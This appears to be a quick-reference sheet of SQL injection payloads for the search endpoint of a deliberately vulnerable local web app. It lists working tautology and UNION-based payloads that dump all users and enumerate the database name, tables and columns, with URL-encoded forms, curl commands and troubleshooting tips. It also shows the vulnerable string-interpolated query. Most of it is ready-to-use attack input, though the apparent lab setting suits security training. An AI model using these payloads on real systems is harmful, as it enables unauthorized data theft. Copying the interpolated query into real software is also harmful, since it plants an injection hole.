# SQL Injection Payloads - Quick Reference

## Search API Endpoint
**URL:** `/api/search?scope=users&q=<payload>`

---

## ❌ Common Mistakes

### Wrong Payloads:
```
❌ q= %' OR '1'='1          (has space, % is part of LIKE pattern)
❌ q=' OR '1'='1            (missing comment to close the query)
❌ q=%' OR '1'='1           (% is part of LIKE pattern)
```

---

## ✅ Correct Payloads

### 1. Extract All Users (Basic)
```
/api/search?scope=users&q=' OR '1'='1'--
```

**What it does:**
- Closes the opening quote: `'`
- Breaks out of LIKE: ` OR '1'='1`
- Comments out rest: `--`

**Resulting SQL:**
```sql
WHERE username LIKE '%' OR '1'='1'--%'
```

---

### 2. Extract All Users (Alternative)
```
/api/search?scope=users&q=' OR 1=1--
```

**Resulting SQL:**
```sql
WHERE username LIKE '%' OR 1=1--%'
```

---

### 3. Union-Based Injection (Extract Database Name)
```
/api/search?scope=users&q=' UNION SELECT database(),2,3,4,5--
```

**Resulting SQL:**
```sql
WHERE username LIKE '%' UNION SELECT database(),2,3,4,5--%'
```

---

### 4. Union-Based Injection (Extract All Tables)
```
/api/search?scope=users&q=' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
```

---

### 5. Extract All Columns from Users Table
```
/api/search?scope=users&q=' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'--
```

---

## 🔧 URL Encoding

If the payload doesn't work, try URL encoding:

### Without Encoding:
```
/api/search?scope=users&q=' OR '1'='1'--
```

### With URL Encoding:
```
/api/search?scope=users&q=%27%20OR%20%271%27%3D%271%27--
```

**Character Encoding:**
- `'` = `%27`
- Space = `%20`
- `=` = `%3D`
- `-` = `%2D`

---

## 🧪 Testing Steps

1. **Check if MySQL is connected:**
   - Look at server console logs
   - Should see: `[DEBUG] Raw query params: { q: "...", scope: "users", isMySQLAvailable: true }`

2. **Test with simple payload:**
   ```
   http://localhost:3000/api/search?scope=users&q=' OR '1'='1'--
   ```

3. **Check server console:**
   - Should see: `[!] Executing vulnerable admin search: ...`
   - Should see: `[DEBUG] Query executed successfully, rows returned: X`

4. **Check response:**
   - Should return JSON with `results` array containing all users
   - `count` should be > 0

---

## 🐛 Troubleshooting

### Issue: Returns empty results
**Possible causes:**
- MySQL not connected (check `isMySQLAvailable()`)
- Wrong payload format
- SQL syntax error

**Solution:**
- Check server console for error messages
- Verify MySQL connection in `.env.local`
- Try the exact payload: `' OR '1'='1'--`

### Issue: Returns error 500
**Possible causes:**
- SQL syntax error
- Database connection failed
- Table doesn't exist

**Solution:**
- Check server console for detailed error
- Verify `users` table exists
- Try simpler payload first

### Issue: Scope parameter not working
**Possible causes:**
- Parameter not passed correctly
- Case sensitivity

**Solution:**
- Ensure `scope=users` (lowercase)
- Check URL encoding
- Verify in server logs: `[DEBUG] Raw query params`

---

## 📝 Example cURL Commands

### Basic SQL Injection:
```bash
curl "http://localhost:3000/api/search?scope=users&q=' OR '1'='1'--"
```

### URL Encoded:
```bash
curl "http://localhost:3000/api/search?scope=users&q=%27%20OR%20%271%27%3D%271%27--"
```

### With Browser:
Just paste in address bar:
```
http://localhost:3000/api/search?scope=users&q=' OR '1'='1'--
```

---

## ⚠️ Important Notes

1. **The payload MUST include `--`** to comment out the trailing `%'` from the LIKE pattern
2. **No space before the quote** - start directly with `'`
3. **Ensure `scope=users`** is set, otherwise it searches products instead
4. **MySQL must be connected** - check environment variables

---

## 🔍 Understanding the Vulnerability

The vulnerable code:
```javascript
const sql = `WHERE username LIKE '%${searchTerm}%'`;
```

When you inject: `' OR '1'='1'--`

The SQL becomes:
```sql
WHERE username LIKE '%' OR '1'='1'--%'
```

The `--` comments out everything after it, so it effectively becomes:
```sql
WHERE username LIKE '%' OR '1'='1'
```

This condition is always true, so it returns all users!

